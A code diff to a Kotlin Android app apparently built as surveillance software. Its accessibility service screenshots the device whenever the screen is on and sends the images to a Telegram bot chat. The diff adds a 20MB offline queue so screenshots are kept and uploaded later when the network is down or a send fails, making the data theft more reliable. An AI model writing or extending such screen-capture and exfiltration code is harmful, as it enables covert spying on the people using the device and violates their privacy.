@@ -33,6 +33,7 @@ import okhttp3.Request
 import java.io.ByteArrayOutputStream
 import java.io.IOException
 import java.util.concurrent.Executor
+import com.example.telegramsender.utils.OfflineQueueManager
 
 class TelegramService : AccessibilityService(), LifecycleOwner {
 
@@ -182,6 +183,11 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                 if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                     if (isScreenOn()) {
                         captureAndSend() // Screenshots still managed here (Accessibility dependent)
+                    }
+
+                    // Check and flush offline queue if network is active
+                    if (OfflineQueueManager.isNetworkAvailable(this@TelegramService) && OfflineQueueManager.getQueueItemCount(this@TelegramService) > 0) {
+                        launch { OfflineQueueManager.flushQueue(this@TelegramService, client) }
                     }
                     
                     // Check logs periodicity (every 1 hour)
@@ -475,6 +481,20 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
         resizedBitmap.recycle()
         
+        // 1. If offline, buffer directly into 20MB local queue without failing or blocking
+        if (!OfflineQueueManager.isNetworkAvailable(this)) {
+            Log.d("TelegramService", "Device offline: saving screenshot to 20MB buffer. Queue: ${OfflineQueueManager.getQueueSummary(this)}")
+            OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_screenshot")
+            return
+        }
+
+        // 2. If online and items exist in offline queue, flush them
+        if (OfflineQueueManager.getQueueItemCount(this) > 0) {
+            CoroutineScope(Dispatchers.IO).launch {
+                OfflineQueueManager.flushQueue(this@TelegramService, client)
+            }
+        }
+
         val requestBody = MultipartBody.Builder()
             .setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", cid)
@@ -488,13 +508,17 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
             client.newCall(request).execute().use { response -> 
                 if (!response.isSuccessful) {
                     Log.e("TelegramService", "Failed to send photo: ${response.code}")
+                    if (response.code >= 500) {
+                        OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_screenshot")
+                    }
                 } else {
                     Log.d("TelegramService", "Photo sent successfully (${byteArray.size} bytes)")
                     getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_screenshot_sent", System.currentTimeMillis()).apply()
                 }
             }
         } catch (e: Exception) {
-            Log.e("TelegramService", "Network error sending photo", e)
+            Log.e("TelegramService", "Network error sending photo, buffering in 20MB offline queue", e)
+            OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_screenshot")
         }
     }
     private fun updateForegroundNotification() {
